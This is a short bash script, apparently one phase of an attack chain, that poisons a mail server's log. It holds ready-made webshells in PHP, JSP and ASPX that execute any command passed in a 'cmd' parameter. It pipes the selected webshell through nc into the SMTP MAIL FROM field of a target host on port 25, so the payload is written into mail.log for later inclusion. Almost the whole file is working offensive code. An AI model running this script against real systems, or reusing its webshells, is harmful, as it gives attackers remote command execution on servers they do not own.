#!/bin/bash
# SMTP Payload Delivery -- Phase 2: inject webshell payload via SMTP MAIL FROM into mail.log
# 用法: deliver_smtp.sh <TARGET_IP>
set -euo pipefail

TARGET_IP="${1:-127.0.0.1}"

echo "=== SMTP Log Poison: Payload Delivery (Phase 2) ==="

LANG="${webshell_lang:-php}"

case "$LANG" in
  php)  PAYLOAD='<?php system($_GET["cmd"]);?>' ;;
  jsp)  PAYLOAD='<%@page import="java.io.*"%><%Process p=Runtime.getRuntime().exec(new String[]{"sh","-c",request.getParameter("cmd")});BufferedReader b=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=b.readLine())!=null)out.println(l);%>' ;;
  aspx) PAYLOAD='<%@ Page Language="C#"%><%var p=new System.Diagnostics.Process();p.StartInfo.FileName="cmd";p.StartInfo.Arguments="/c "+Request["cmd"];p.StartInfo.RedirectStandardOutput=true;p.StartInfo.UseShellExecute=false;p.Start();Response.Write(p.StandardOutput.ReadToEnd());%>' ;;
  *)    PAYLOAD='<?php system($_GET["cmd"]);?>' ;;
esac

(printf 'EHLO x\r\nMAIL FROM:<%s>\r\nQUIT\r\n' "$PAYLOAD" | \
  nc -w 3 "$TARGET_IP" 25 >/dev/null 2>&1) || true
sleep 2
echo "SMTP_PAYLOAD_DELIVERED"
